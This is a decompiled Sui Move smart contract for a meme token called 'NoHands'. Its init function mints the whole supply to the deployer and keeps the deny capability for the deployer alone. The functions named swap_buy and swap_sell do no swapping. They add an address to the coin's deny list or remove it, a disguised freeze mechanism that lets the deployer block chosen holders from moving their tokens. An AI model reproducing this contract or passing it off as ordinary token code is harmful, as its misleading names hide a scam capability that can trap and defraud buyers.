module 0xd81fb29df80f33a64c101be97a80017d4ddf7ed012ec469f7551d0bb46899725::nohands {
    struct NOHANDS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NOHANDS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NOHANDS>(arg0, 9, b"NoHands", b"No Hands", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmc3xyq1NmTQhofbMYqsZAmHRs4Z2JoZjFf38ysUKv4UcR"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NOHANDS>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NOHANDS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NOHANDS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NOHANDS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NOHANDS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NOHANDS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NOHANDS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NOHANDS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

